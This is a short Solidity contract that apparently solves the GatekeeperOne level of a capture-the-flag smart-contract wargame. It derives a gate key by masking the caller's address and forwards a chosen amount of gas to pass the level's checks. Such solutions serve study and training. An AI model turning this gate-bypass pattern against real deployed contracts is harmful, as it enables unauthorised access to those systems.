pragma solidity ^0.6.0;

import '../levels/GatekeeperOne.sol';

contract GatekeeperOneAttack {

    GatekeeperOne gate;

    constructor(address gatekeeperAddress) public {
        gate = GatekeeperOne(gatekeeperAddress);
    }

    function run(uint gasToForward) public {
        bytes8 key = bytes8(uint64(msg.sender)) & 0xffffffff0000ffff;
        gate.enter{gas: gasToForward}(key);
    }

}
